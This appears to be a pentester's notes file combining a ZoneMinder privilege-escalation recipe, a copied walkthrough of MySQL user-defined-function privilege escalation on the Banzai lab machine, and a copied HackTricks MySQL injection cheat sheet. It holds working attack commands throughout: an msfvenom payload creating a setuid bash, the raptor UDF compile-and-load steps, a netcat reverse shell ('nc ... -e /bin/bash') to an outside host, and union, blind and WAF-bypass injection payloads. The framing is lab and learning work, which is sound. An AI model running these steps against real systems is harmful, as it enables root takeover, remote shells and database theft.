
##
#
https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf
#
https://r3dbuck3t.notion.site/MySQL-UDF-functions-3542db4a45ba4b7ea9b946098f9f80a3
#
https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/sql-injection/mysql-injection/README.md
#
##



```
harvest pass...
 /things/www/webroot/zoneminder/www/api/app/Config/database.php

gen shared object lib...
msfvenom -p linux/x64/exec CMD="cp /bin/bash /var/tmp/bash; chmod u+s /var/tmp/bash;" -f elf-so -o yoyo.so

do the things...
yoyo.so to /var/tmp/yoyo.so
mysql -u zmuser -pROOTPASSWORDLOL -e "use zm;update Config set value='/var/tmp/yoyo.so' where name='ZM_LD_PRELOAD';"

A .so file on Linux is a shared object file, which is a dynamic-link library format used by the Linux operating system and other Unix-like systems.
Shared object files are similar to dynamic link libraries (DLLs) on Windows systems. These files contain compiled code and data that can be used by multiple programs at the same time.
The term "shared" indicates that multiple programs can share the code in memory, reducing redundancy and improving system efficiency.

```

Privilege Escalation with MySQL User Defined Functions
Nairuz Abulhul
R3d Buck3T
Nairuz Abulhul

·




Extending MySQL functionality with UDFs — Banzai, Proving Grounds


https://unsplash.com/photos/qeiyUaSX6fk — Miguel Teirlinck
Functions are a block of queries and statements that take inputs and return values. All popular database systems provide a wide range of built-in functions to perform operations and tasks related to their systems.

Sometimes, there is a need to create custom functions that are not available through the built-in functions to perform specific operations. Relational database systems provide that flexibility and the mechanism to allow users to create their custom functions and run them natively the same way as the built-ins; they are called User Defined Functions (UDF).

UDF functions are language agnostic; they are written in any programming language to be compiled natively into a shared library. Usually, the steps involve writing a library, either a shared object in Linux, or DLL in Windows, putting that library into a system directory, then creating the SQL functions.

These functions can be modified independently, and stored in the database for multiple uses.

From an offensive perspective, that is great news 😈. We can create malicious functions to run commands on the underlying operating system with the same privileges as the running service. If the compromised target runs a SQL server as root, we can run the commands as root as well.

This post will walk through creating a UDF function to escalate privileges on a Linux system that runs MySQL database server as root. The performing steps are on the Banzai machine from Offensive Security — Proving Grounds.

🔥$_Attack_Steps
We have the initial foothold as a low priv user “www-data” user. Through the post-exploitation enumeration, I found there is a MySQL server running locally on port 3306. Looking into the processes list, I found the MySQL process is running as root.


Looking through the config.php file, I found the password for the root user. Before this box, I didn’t know about UDF functions. However, I know that mysql provides a way to execute shell commands directly to the system. So, I started searching for ways to execute commands as root since I have access as one, and I came across the UDF functions and the raptor exploits by Macro Ivaldi that works on MySQL.


UDF exploit
We download the exploit locally with wget command, then transfer the exploit to the target machine to compile it with gcc since it is installed on the machine. Then compile the exploit, and make it a shared library.

📌 It is essential to take into consideration the target machine architecture when compiling the exploit to avoid running into errors later.

gcc -g -c raptor_udf2.c  #compile the exploit code
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc        #create the shared library (so)

compiling an exploit
Next step, we connect to the MySQL database with the retrieved credentials and look around for the location of the plugins directory where MySQL stores its UDF functions. Then, we move the shared library we compiled earlier into that directory.

Authenticating to mysql

mysql -u root -p
Locating the Plugins Path:

show variables like '%plugin%';

searching for the locations of the plugins directory
Also, we need to check if the variable secure_file_priv is enabled to allow data import and export operations like load_file and load_data functions.

If the returned value is null/empty, as in the below screenshot, it means the variable is disabled, and we can load data into the database.

show variables like '%secure_file_priv%';

secure_file_priv is disabled
Now we know where we should store the exploit and have all the needed permissions. Next, we will switch to the mysql database and create the UDF function inside mysql to point to our compiled exploit (shared library).

Switch to mysql database.
use mysql;

Create a table to hold the exploit code.
create table foo(line blob);
Import the exploit by inserting its contents into the table. Provide the directory path of where the exploit was compiled. In our case, it was compiled in the /var/www directory, where the current user “www-data” has writing permissions.
insert into foo values(load_file('/var/www/raptor_udf2.so'));

Next, select the binary contents in the shared library and dump them onto the plugins directory, where UDFS can be stored.
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
Lastly, call the exploit by creating a function that invokes it.
create function do_system returns integer soname 'raptor_udf2.so';

Confirm the function is present in mysql.
select * from mysql.func;
We have the “do_system” function created. Great !!!


After creating the UDF function, let’s test it by running an OS command like “id” and redirect its output to a file we can read.

select do_system('id > /var/www/output; chown www-data www-data  /var/www/output');

output file shows the command executed as root
We see that our id id root. Now, we can pass the function a netcat command to get a shell back to our machine.

select do_system('nc 192.168.49.136 8080 -e /bin/bash');

running netcat shell

root user — netcat shell
That’s all for today. Thanks for reading.

All of the used commands can be found at R3d-Buck3T — Notion (Linux — Privilege Escalation via MySQL)



##
##


# MySQL injection

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/) is the most relevant cybersecurity event in **Spain** and one of the most important in **Europe**. With **the mission of promoting technical knowledge**, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.

{% embed url="https://www.rootedcon.com/" %}

## Comments

```sql
-- MYSQL Comment
# MYSQL Comment
/* MYSQL Comment */
/*! MYSQL Special SQL */
/*!32302 10*/ Comment for MySQL version 3.23.02
```

## Interesting Functions

### Confirm Mysql:

```
concat('a','b')
database()
version()
user()
system_user()
@@version
@@datadir
rand()
floor(2.9)
length(1)
count(1)
```

### Useful functions

```sql
SELECT hex(database())
SELECT conv(hex(database()),16,10) # Hexadecimal -> Decimal
SELECT DECODE(ENCODE('cleartext', 'PWD'), 'PWD')# Encode() & decpde() returns only numbers
SELECT uncompress(compress(database())) #Compress & uncompress() returns only numbers
SELECT replace(database(),"r","R")
SELECT substr(database(),1,1)='r'
SELECT substring(database(),1,1)=0x72
SELECT ascii(substring(database(),1,1))=114
SELECT database()=char(114,101,120,116,101,115,116,101,114)
SELECT group_concat(<COLUMN>) FROM <TABLE>
SELECT group_concat(if(strcmp(table_schema,database()),table_name,null))
SELECT group_concat(CASE(table_schema)When(database())Then(table_name)END)
strcmp(),mid(),,ldap(),rdap(),left(),rigth(),instr(),sleep()
```

## All injection

```sql
SELECT * FROM some_table WHERE double_quotes = "IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/"
```

from [https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/](https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/)

## Flow

Remember that in "modern" versions of **MySQL** you can substitute "_**information\_schema.tables**_" for "_**mysql.innodb\_table\_stats**_**"** (This could be useful to bypass WAFs).

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema=database();#Get name of the tables
SELECT column_name FROM information_schema.columns WHERE table_name="<TABLE_NAME>"; #Get name of the columns of the table
SELECT <COLUMN1>,<COLUMN2> FROM <TABLE_NAME>; #Get values
SELECT user FROM mysql.user WHERE file_priv='Y'; #Users with file privileges
```

### **Only 1 value**

* `group_concat()`
* `Limit X,1`

### **Blind one by one**

* `substr(version(),X,1)='r'` or `substring(version(),X,1)=0x70` or `ascii(substr(version(),X,1))=112`
* `mid(version(),X,1)='5'`

### **Blind adding**

* `LPAD(version(),1...lenght(version()),'1')='asd'...`
* `RPAD(version(),1...lenght(version()),'1')='asd'...`
* `SELECT RIGHT(version(),1...lenght(version()))='asd'...`
* `SELECT LEFT(version(),1...lenght(version()))='asd'...`
* `SELECT INSTR('foobarbar', 'fo...')=1`

## Detect number of columns

Using a simple ORDER

```
order by 1
order by 2
order by 3
...
order by XXX

UniOn SeLect 1
UniOn SeLect 1,2
UniOn SeLect 1,2,3
...
```

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​[**RootedCON**](https://www.rootedcon.com/) is the most relevant cybersecurity event in **Spain** and one of the most important in **Europe**. With **the mission of promoting technical knowledge**, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.

{% embed url="https://www.rootedcon.com/" %}

## MySQL Union Based

```sql
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...
```

## SSRF

**Learn here different options to** [**abuse a Mysql injection to obtain a SSRF**](mysql-ssrf.md)**.**

## WAF bypass tricks

### Information\_schema alternatives

Remember that in "modern" versions of **MySQL** you can substitute _**information\_schema.tables**_ for _**mysql.innodb\_table\_stats**_\*\* \*\* or for _**sys.x$schema\_flattened\_keys**_ or for **sys.schema\_table\_statistics**

![](<../../../.gitbook/assets/image (154).png>)

![](<../../../.gitbook/assets/image (155).png>)

### MySQLinjection without COMMAS

Select 2 columns without using any comma ([https://security.stackexchange.com/questions/118332/how-make-sql-select-query-without-comma](https://security.stackexchange.com/questions/118332/how-make-sql-select-query-without-comma)):

```
-1' union select * from (select 1)UT1 JOIN (SELECT table_name FROM mysql.innodb_table_stats)UT2 on 1=1#
```

### Retrieving values without the column name

If at some point you know the name of the table but you don't know the name of the columns inside the table, you can try to find how may columns are there executing something like:

```bash
# When a True is returned, you have found the number of columns
select (select "", "") = (SELECT * from demo limit 1);     # 2columns
select (select "", "", "") < (SELECT * from demo limit 1); # 3columns
```

Supposing there is 2 columns (being the first one the ID) and the other one the flag, you can try to bruteforce the content of the flag trying character by character:

```bash
# When True, you found the correct char and can start ruteforcing the next position
select (select 1, 'flaf') = (SELECT * from demo limit 1);
```

More info in [https://medium.com/@terjanq/blind-sql-injection-without-an-in-1e14ba1d4952](https://medium.com/@terjanq/blind-sql-injection-without-an-in-1e14ba1d4952)

### MySQL history

You ca see other executions inside the MySQL reading the table: **sys.x$statement\_analysis**

### Version alternative**s**

```
mysql> select @@innodb_version;
+------------------+
| @@innodb_version |
+------------------+
| 5.6.31           |
+------------------+

mysql> select @@version;
+-------------------------+
| @@version               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+

mysql> mysql> select version();
+-------------------------+
| version()               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+
```

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​[**RootedCON**](https://www.rootedcon.com/) is the most relevant cybersecurity event in **Spain** and one of the most important in **Europe**. With **the mission of promoting technical knowledge**, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

